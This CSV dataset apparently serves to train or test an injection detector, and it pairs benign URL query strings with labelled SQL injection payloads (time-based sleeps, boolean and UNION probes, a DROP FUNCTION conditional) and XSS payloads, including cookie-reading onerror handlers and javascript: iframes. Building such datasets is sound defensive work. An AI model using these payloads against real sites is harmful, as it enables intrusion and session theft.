payload,label,oracle,obf_payload,techniques,unchanged
theme=dark&sort=asc&price_max=673,benign,n/a,,,False
',sqli,error,,,False
ORDER BY 10,sqli,invalid,,,False
theme=dark,benign,n/a,,,False
session=520f8e5,benign,n/a,,,False
token=1b29664&redirect=/home,benign,n/a,,,False
callback=invoice,benign,n/a,,,False
"""><iframe src='https://testforiframe.site/'>",xss,valid,,,False
RLIKE (SELECT (CASE WHEN (4346=4347) THEN 0x61646d696e ELSE 0x28 END)) AND 'Txws'=',sqli,error,,,False
"<IMG SRC=""javascript:alert('XSS');"">",xss,valid,,,False
color=book&tab=foxtrot,benign,n/a,,,False
OR 1=0--,sqli,invalid,,,False
search=phone,benign,n/a,,,False
callback=citra,benign,n/a,,,False
"or benchmark(50000000,MD5(1))#",sqli,invalid,,,False
price_min=4273&name=budget&lang=en,benign,n/a,,,False
AS INJECTX WHERE 1=1 AND 1=0--,sqli,invalid,,,False
"or benchmark(50000000,MD5(1))--",sqli,invalid,,,False
category=citra&offset=2030&lang=id,benign,n/a,,,False
sort=desc&name=shoes,benign,n/a,,,False
search=settings&lang=en&format=json,benign,n/a,,,False
<marquee onstart=alert(1)></marquee>,xss,valid,,,False
"""><script>alert(document.domain)</script>",xss,valid,,,False
name=budget&id=7730&page=2459,benign,n/a,,,False
city=shoes&q=shoes&session=5ee77af,benign,n/a,,,False
size=m&qty=9325,benign,n/a,,,False
q=jakarta&lang=en&coupon=citra,benign,n/a,,,False
<Script>alert(1)</Script>,xss,valid,,,False
redirect=/home&user_id=2880,benign,n/a,,,False
lang=en&id=7103&theme=dark,benign,n/a,,,False
HAVING 1=0#,sqli,invalid,,,False
price_max=7917,benign,n/a,,,False
--><script>alert(1)</script>,xss,valid,,,False
currency=usd&page=8543,benign,n/a,,,False
"1 or benchmark(10000000,MD5(1))#",sqli,invalid,,,False
"<body onmouseover=""print()"">",xss,valid,,,False
theme=dark&callback=delta,benign,n/a,,,False
color=camera&offset=3049,benign,n/a,,,False
color=foxtrot&email=jakarta@example.com,benign,n/a,,,False
sort=asc&qty=8317,benign,n/a,,,False
AND (SELECT * FROM (SELECT(SLEEP(5)))nQIP)--,sqli,invalid,,,False
ORDER BY 1,sqli,invalid,,,False
waitfor delay '00:00:05'--,sqli,error,,,False
ORDER BY 16,sqli,invalid,,,False
session=4efdb02,benign,n/a,,,False
IF(7423=7424) SELECT 7423 ELSE DROP FUNCTION xcjl--,sqli,invalid,,,False
&lt;img src=0 onerror=alert(document.cookie)&gt;,xss,valid,,,False
')) or pg_sleep(5)--,sqli,error,,,False
AND 7300=7300 AND ('pKlZ'='pKlY,sqli,error,,,False
name=profile&token=15e9771,benign,n/a,,,False
' or pg_sleep(5)--,sqli,error,,,False
view=grid&q=book&redirect=/home,benign,n/a,,,False
tab=jakarta&view=grid&callback=orders,benign,n/a,,,False
offset=1331,benign,n/a,,,False
token=1003a3f&limit=4755,benign,n/a,,,False
ORDER BY 30,sqli,invalid,,,False
';WAITFOR DELAY '0:0:30'--,sqli,uncertain,,,False
"<body style=""background-color:red !important;"">",xss,invalid,,,False
ORDER BY 14,sqli,invalid,,,False
ORDER BY 18,sqli,invalid,,,False
search=foxtrot,benign,n/a,,,False
qty=2003&city=shoes&lang=en,benign,n/a,,,False
' UNION SELECT sum(columnname ) from tablename --,sqli,error,,,False
"<img src="""" onerror=""alert(document.cookie)"">",xss,valid,,,False
"<IFRAME SRC=""javascript:alert('XSS');""></IFRAME>",xss,valid,,,False
token=5b74eb1,benign,n/a,,,False
format=json&session=583cdc0&search=profile,benign,n/a,,,False
-- or #,sqli,invalid,,,False
offset=5890&view=grid,benign,n/a,,,False
""" OR 1 = 1 -- -",sqli,invalid,,,False
theme=dark&coupon=book&email=citra@example.com,benign,n/a,,,False
search=jakarta&currency=usd,benign,n/a,,,False
price_max=7106,benign,n/a,,,False
city=book&price_max=1295&q=delta,benign,n/a,,,False
ORDER BY 29,sqli,invalid,,,False
id=1355&format=json&search=shoes,benign,n/a,,,False
));waitfor delay '0:0:5'--,sqli,error,,,False
%' AND 8310=8311 AND '%'=',sqli,invalid,,,False
currency=usd&name=orders,benign,n/a,,,False
prompt(document.domain),xss,invalid,,,False
price_max=1626,benign,n/a,,,False
ORDER BY 15,sqli,invalid,,,False
city=settings&color=citra,benign,n/a,,,False
price_min=1642&redirect=/home&qty=5634,benign,n/a,,,False
lang=id&tab=shoes&city=dashboard,benign,n/a,,,False
